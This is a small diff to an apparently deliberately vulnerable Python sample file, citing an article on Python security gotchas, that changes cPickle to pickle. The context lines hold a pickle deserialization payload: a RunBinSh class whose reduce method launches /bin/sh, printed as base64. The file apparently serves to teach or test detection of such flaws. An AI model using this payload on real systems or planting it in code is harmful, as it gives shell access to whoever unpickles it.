@@ -3,8 +3,9 @@
 # taken from https://hackernoon.com/10-common-security-
 # gotchas-in-python-and-how-to-avoid-them-e19fbe265e03
 import base64
-import cPickle
 import subprocess
+import pickle
+
 
 # Input injection
 def transcode_file(filename):
@@ -27,4 +28,4 @@ class RunBinSh():
         return (subprocess.Popen, (('/bin/sh',),))
 
 
-print(base64.b64encode(cPickle.dumps(RunBinSh())))
+print(base64.b64encode(pickle.dumps(RunBinSh())))
